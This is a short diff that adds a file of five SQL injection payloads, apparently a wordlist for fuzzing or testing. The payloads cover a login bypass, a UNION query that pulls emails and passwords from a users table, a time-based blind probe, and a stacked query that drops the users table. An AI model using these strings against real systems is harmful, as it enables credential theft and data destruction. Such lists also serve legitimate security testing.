@@ -1,0 +1,5 @@
+' OR 1=1--
+1 UNION SELECT email,password FROM users
+admin' AND SLEEP(1)--
+" OR "1"="1
+1; DROP TABLE users--
